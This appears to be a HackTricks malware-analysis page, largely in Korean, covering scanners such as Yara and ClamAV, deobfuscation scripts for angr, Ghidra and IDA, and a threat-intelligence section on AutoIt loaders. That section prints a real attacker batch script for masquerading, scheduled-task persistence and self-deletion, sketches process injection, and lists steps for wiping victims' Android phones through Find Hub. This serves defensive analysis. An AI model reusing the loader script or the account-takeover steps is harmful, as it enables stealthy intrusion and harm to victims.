# Malware Analysis

{{#include ../../banners/hacktricks-training.md}}

## Forensics CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## 온라인 서비스

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## 오프라인 Antivirus and Detection Tools

### Yara

#### 설치
```bash
sudo apt-get install -y yara
```
#### 규칙 준비

이 스크립트를 사용하여 github에서 모든 yara malware 규칙을 다운로드하고 병합하세요: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
_**rules**_ 디렉토리를 생성하고 실행하세요. 이렇게 하면 _**malware_rules.yar**_라는 파일이 생성되며, 해당 파일에는 모든 malware에 대한 yara 규칙이 포함됩니다.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Scan
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malware 확인 및 규칙 생성

바이너리에서 yara rules를 생성하기 위해 도구 [**YaraGen**](https://github.com/Neo23x0/yarGen)을 사용할 수 있습니다. 다음 튜토리얼을 확인하세요: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### 설치
```
sudo apt-get install -y clamav
```
#### 스캔
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa**는 실행 파일(PE, ELF, .NET)에서 잠재적으로 악성인 **capabilities**를 탐지합니다. 따라서 Att\&ck tactics와 같은 항목이나 다음과 같은 의심스러운 capabilities를 찾아냅니다:

- check for OutputDebugString error
- run as a service
- create process

다운로드는 [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC는 Indicator Of Compromise를 의미합니다. IOC는 잠재적으로 원치 않는 소프트웨어나 확인된 **malware**를 식별하는 **conditions that identify**의 집합입니다.\
Blue Teams는 이러한 정의를 사용하여 자사 **systems** 및 **networks**에서 이러한 유형의 악성 파일을 찾아냅니다.\
이 정의들을 공유하는 것은 유용합니다. 한 컴퓨터에서 malware가 식별되어 그에 대한 IOC가 생성되면, 다른 Blue Teams가 이를 사용해 해당 malware를 더 빠르게 식별할 수 있기 때문입니다.

IOCs를 생성하거나 수정하는 도구로는 [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
[**Redline**](https://www.fireeye.com/services/freeware/redline.html)와 같은 도구를 사용하여 **device에서 정의된 IOCs를 검색할 수 있습니다**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) 는 Simple Indicators of Compromise를 위한 스캐너입니다.\
탐지는 네 가지 탐지 방법에 기반합니다:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) 은 GNU GPLv2 라이선스로 배포되는 Linux용 malware 스캐너로, 공유 호스팅 환경에서 직면하는 위협을 중심으로 설계되었습니다. 이 도구는 네트워크 엣지 침입 탐지 시스템으로부터의 위협 데이터를 사용해 공격에 실제로 사용되는 malware를 추출하고 탐지를 위한 시그니처를 생성합니다. 또한 LMD checkout 기능을 통한 사용자 제출과 malware 커뮤니티 리소스에서도 위협 데이터가 파생됩니다.

### rkhunter

[**rkhunter**](http://rkhunter.sourceforge.net) 같은 도구는 파일 시스템을 검사하여 잠재적인 **rootkits** 및 malware를 확인하는 데 사용할 수 있습니다.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) 은 다양한 기법으로 executables 내부의 obfuscated strings을 찾아내려고 시도하는 도구입니다.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)실행 파일 내부의 기본적인 항목들(binary data, entropy, URLs and IPs, 일부 yara rules)을 검사합니다.

### PEstudio

[PEstudio](https://www.winitor.com/download) 는 Windows executables의 imports, exports, headers 같은 정보를 얻을 수 있게 해주며, virus total을 확인하고 잠재적인 Att\&ck techniques를 찾아냅니다.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) 는 파일이 **encrypted**인지 감지하고 **packers**를 찾아내는 도구입니다.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)은 text/script files 내의 **obfuscated** 및 **encrypted** 콘텐츠를 탐지하기 위해 다양한 **statistical methods**를 사용하는 Python 스크립트입니다. NeoPI의 목적은 **detection of hidden web shell code**를 돕는 것입니다.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) 는 **obfuscated**/**dodgy code**를 탐지하려 최선을 다하며, 종종 **malwares**/webshells에서 사용되는 **PHP** 함수들을 사용하는 파일도 찾아냅니다.

### Apple Binary Signatures

어떤 **malware sample**을 검사할 때는 항상 바이너리의 **check the signature**을 확인해야 합니다. 서명한 **developer**가 이미 **related** with **malware**일 수 있기 때문입니다.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## 탐지 기법

### File Stacking

웹 서버의 **files**가 들어 있는 어떤 폴더가 **last updated on some date**임을 알고 있다면, 웹 서버의 모든 **files**의 생성·수정 **date**를 확인하고, 의심스러운 **date**가 있으면 해당 파일을 점검하라.

### Baselines

폴더의 파일들이 **shouldn't have been modified** 상태여야 한다면, 그 폴더의 원본 파일들의 **hash**를 계산해 현재 파일들과 **compare**하라. 변경된 항목은 모두 **suspicious**하다.

### Statistical Analysis

정보가 로그에 저장되어 있을 때, 웹 서버의 각 파일이 몇 번 접근되었는지 같은 통계를 **check**할 수 있다 — web shell이 가장 많이 접근된 항목 중 하나일 수 있다.

---

### Android in-app native telemetry (no root)

Android에서는 대상 앱 프로세스 내부의 native 코드를, 다른 JNI 라이브러리가 초기화되기 전에 작은 로거 라이브러리를 preload하여 계측할 수 있다. 이렇게 하면 시스템 전체 후킹이나 root 없이도 native 동작을 조기에 관찰할 수 있다. 흔한 방법은 SoTap: 올바른 ABI에 맞는 libsotap.so를 APK에 넣고 System.loadLibrary("sotap") 호출을 일찍(예: static initializer 또는 Application.onCreate) 삽입한 뒤, 내부/외부 경로나 Logcat을 통해 로그를 수집하는 방식이다.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

일부 Android malware 및 RASP-protected 앱은 JNI 메서드 이름과 시그니처를 runtime에 복호화한 뒤 RegisterNatives를 호출하기 전에 숨긴다. Frida/ptrace 계측이 anti-debug에 의해 차단될 때에도, angr로 바이너리 내부의 디코더를 실행하여 오프라인에서 평문을 복구한 다음 결과를 Ghidra에 코멘트로 넣어 복원할 수 있다.

핵심 아이디어: .so 내부의 디코더를 호출 가능한 함수로 취급하여 .rodata의 난독화된 바이트 블롭에 대해 실행하고, 출력 바이트를 첫 번째 \x00(C-문자열 종료자)까지 구체화(concretize)한다. 주소 불일치를 피하려면 angr와 Ghidra가 동일한 image base를 사용하도록 하라.

Workflow overview
- Ghidra에서 1차 분류: JNI_OnLoad 및 RegisterNatives 설정에서 디코더와 그 호출 규약/인자를 식별한다.
- angr(CPython3)로 각 타깃 문자열에 대해 디코더를 실행하고 결과를 덤프한다.
- Ghidra에 주석 달기: 호출 지점마다 자동으로 디코딩된 문자열을 코멘트로 추가해 빠르게 JNI를 재구성한다.

Ghidra triage (JNI_OnLoad pattern)
- Ghidra가 JNINativeMethod 구조체를 인식하도록 JNI_OnLoad에 JNI datatype을 적용한다.
- Oracle 문서상의 전형적인 JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives 호출을 찾아라. 라이브러리가 이름/시그니처를 로컬 루틴(예: FUN_00100e10)으로 구성하고 정적 바이트 테이블(예: DAT_00100bf4)을 참조하며 (encoded_ptr, out_buf, length) 같은 인자를 받는다면, 오프라인 실행의 이상적인 타깃이다.

angr setup (execute the decoder offline)
- Ghidra에서 사용한 것과 동일한 base로 .so를 로드(예: 0x00100000)하고 외부 라이브러리의 자동 로딩을 비활성화하여 상태를 작게 유지한다.

<details>
<summary>angr 설정 및 오프라인 디코더 실행</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- 대규모로는 call sites에서 decoder의 인수 (encoded_ptr, size)로의 정적 맵을 구축하세요. Wrappers는 인수를 숨길 수 있으므로, API recovery가 불안정한 경우 Ghidra xrefs에서 이 매핑을 수동으로 생성할 수 있습니다.

<details>
<summary>angr로 여러 call sites를 일괄 decode</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra에서 호출 지점에 주석 추가
옵션 A: Jython 전용 코멘트 작성기 (사전 계산된 JSON 사용)
- angr가 CPython3을 필요로 하므로, 난독화 해제와 주석 작성을 분리하세요. 먼저 위의 angr 스크립트를 실행해 decoded_strings.json을 생성하세요. 그런 다음 이 Jython GhidraScript를 실행하여 각 호출 지점에 PRE_COMMENTs를 작성합니다(컨텍스트로 호출자 함수 이름 포함):

<details>
<summary>디코딩된 JNI 문자열에 주석을 추가하는 Ghidra Jython 스크립트</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: pyhidra/ghidra_bridge를 통한 단일 CPython 스크립트
- 또는 pyhidra나 ghidra_bridge를 사용해 angr를 실행하는 동일한 CPython 프로세스에서 Ghidra의 API를 제어할 수 있습니다. 이렇게 하면 decode_string()을 호출하고 중간 파일 없이 즉시 PRE_COMMENTs를 설정할 수 있습니다. 로직은 Jython 스크립트와 유사합니다: ReferenceManager를 통해 callsite→function 맵을 구축하고, angr로 디코드한 다음 코멘트를 설정합니다.

Why this works and when to use it
- Offline 실행은 RASP/anti-debug를 우회합니다: 문자열을 복구하기 위해 ptrace나 Frida 훅이 필요 없습니다.
- Ghidra와 angr의 base_addr를 맞춰(예: 0x00100000) 두 도구 간에 함수/데이터 주소가 일치하도록 합니다.
- 디코더에 대한 반복 가능한 레시피: 변환을 순수 함수로 취급하고, 새 상태에 출력 버퍼를 할당한 다음 (encoded_ptr, out_ptr, len)로 호출하고 state.solver.eval로 구체화(concretize)한 뒤 \x00까지의 C-strings를 파싱합니다.

Notes and pitfalls
- 대상 ABI/calling convention을 준수하세요. angr.factory.callable은 arch에 따라 하나를 선택합니다; 인수가 밀려 보이면 cc를 명시적으로 지정하세요.
- 디코더가 0으로 초기화된 출력 버퍼를 기대하면 호출 전에 상태에서 outbuf를 0으로 초기화하세요.
- position-independent Android .so의 경우, angr에서 보는 주소가 Ghidra에서 보는 주소와 일치하도록 항상 base_addr를 제공하세요.
- 앱이 디코더를 얇은 스텁 뒤에 감춰도 call-xrefs를 열거하려면 currentProgram.getReferenceManager()를 사용하세요.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

현대 악성코드 군은 Control-Flow Graph (CFG) 난독화를 심하게 남용합니다: 직접적인 jump/call 대신 실행 시 목적지를 계산하고 `jmp rax` 또는 `call rax`를 실행합니다. 작은 *dispatcher*(보통 아홉 개의 명령어)는 CPU의 `ZF`/`CF` 플래그에 따라 최종 타겟을 설정하여 정적 CFG 복구를 완전히 무너뜨립니다.

이 기법은 SLOW#TEMPEST loader가 보여준 바와 같이 IDAPython과 Unicorn CPU 에뮬레이터만으로도 세 단계의 워크플로우로 무력화할 수 있습니다.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. dispatcher byte-code를 추출
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn으로 두 번 에뮬레이트하기
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
`run(code,0,0)`과 `run(code,1,1)`을 실행하여 *false* 및 *true* 분기 대상을 얻습니다.

### 4. 직접적인 jump / call을 패치하여 복원
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
패치 후 전체 CFG 및 Hex-Rays 출력이 복원되도록 IDA가 해당 함수를 다시 분석하게 강제합니다:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. 간접 API 호출에 라벨 지정

모든 `call rax`의 실제 목적지가 확인되면 IDA에 그것을 알려 매개변수 타입과 변수 이름이 자동으로 복구되게 할 수 있습니다:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### 실용적 이점

* 실제 CFG를 복원 → 디컴파일 결과가 *10*줄에서 수천 줄로 증가.
* string-cross-reference & xrefs를 활성화하여 동작 재구성이 매우 쉬워짐.
* Scripts는 재사용 가능: 동일한 트릭으로 보호된 어떤 loader에든 넣어 사용 가능.

---

## AutoIt 기반 loaders: .a3x 복호화, Task Scheduler 가장 및 RAT 인젝션

이 침투 패턴은 서명된 MSI, .a3x로 컴파일된 AutoIt loaders, 그리고 정상 앱으로 가장한 Task Scheduler 작업을 연쇄적으로 사용한다.

### MSI → custom actions → AutoIt 오케스트레이터

MSI custom actions에 의해 실행되는 프로세스 트리 및 명령:

- MsiExec.exe → cmd.exe가 install.bat을 실행
- WScript.exe가 미끼용 오류 대화상자를 표시
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader를 drop하고, persistence를 설정하고, self-cleans함):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (사용자 미끼):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- AutoIt3.exe 및 IoKlTr.au3를 C:\Users\Public\Music에 드롭함
- schtasks.exe를 hwpviewer.exe로 복사함 (Hangul Word Processor viewer로 가장)
- 1분마다 실행되는 "IoKlTr"라는 스케줄된 작업 생성
- 시작 항목 LNK는 Smart_Web.lnk로 보임; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- %APPDATA%\Google\Browser\ 하위 폴더(이름에 `adb` 또는 `adv` 포함)에 모듈들을 스테이지하고 autoit.vbs/install.bat 헬퍼로 시작함

Forensic triage tips:
- schtasks 열거: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML과 같은 위치에 있는 schtasks.exe의 이름이 변경된 복사본 확인: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- 일반 경로: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, 시작 항목 `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- 프로세스 생성 연관성 확인: AutoIt3.exe가 정식 Windows 바이너리(예: cleanmgr.exe, hncfinder.exe)를 생성하는지 확인

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt 모듈은 `#AutoIt3Wrapper_Outfile_type=a3x`로 컴파일되며, 임베디드 payload를 복호화한 다음 안전한 프로세스에 인젝션함.
- 관찰된 패밀리: QuasarRAT (hncfinder.exe에 인젝션됨) 및 RftRAT/RFTServer (cleanmgr.exe에 인젝션됨), 그리고 RemcosRAT 모듈들 (`Remcos\RunBinary.a3x`).
- 복호화 패턴: HMAC으로 AES 키를 유도한 뒤, 임베디드 블롭을 복호화하고 평문 모듈을 인젝션함.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- 대상 호스트에 대해 CreateProcess (suspended) 실행 (예: cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory로 decrypted module/shellcode 기록
- payload 실행을 위해 CreateRemoteThread 또는 QueueUserAPC 사용

Hunting ideas
- MsiExec.exe 또는 WScript.exe를 부모로 하여 시스템 유틸리티를 실행하는 AutoIt3.exe
- public/user-writable 경로에 있는 `.a3x` 확장자 파일 또는 AutoIt script runners
- 분 단위 트리거로 설정되어 AutoIt3.exe를 실행하거나 Microsoft에서 서명하지 않은 바이너리를 실행하는 의심스러운 scheduled tasks

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows 침해 동안, 운영자는 도난당한 Google 자격증명을 사용해 피해자의 Android 기기를 반복적으로 초기화(공장초기화)했으며, 피해자의 로그인된 데스크탑 메신저를 통해 접근을 확장하는 동안 알림을 숨겼습니다.

Operator steps (from a logged-in browser session):
- Google Account → Security → Your devices 검토; Find My Phone → Find Hub (https://www.google.com/android/find)로 이동
- 기기 선택 → Google 비밀번호 재입력 → "Erase device" (factory reset) 실행; 복구 지연을 위해 반복
- 선택 사항: 연결된 메일박스(예: Naver)의 경고 이메일을 삭제하여 보안 알림 숨기기

## AdaptixC2: Configuration Extraction and TTPs

전용 페이지 참조:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: 인앱 JNI (.so) 동작을 경량으로 로깅하는 도구 – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Android 애플리케이션의 네이티브 코드 분석 전략: Ghidra와 Symbolic Execution을 결합한 코드 복호화 및 난독화 해제 – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- JNI 함수 추적 – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: 숨겨진 JNI 함수를 발견하기 위해 Ghidra와 Frida를 스크립팅하기 – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI 관련 APT가 Windows 침해 후 Google Find Hub를 악용해 Android 기기를 초기화 – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer 기술 분석 – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC 배경 – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
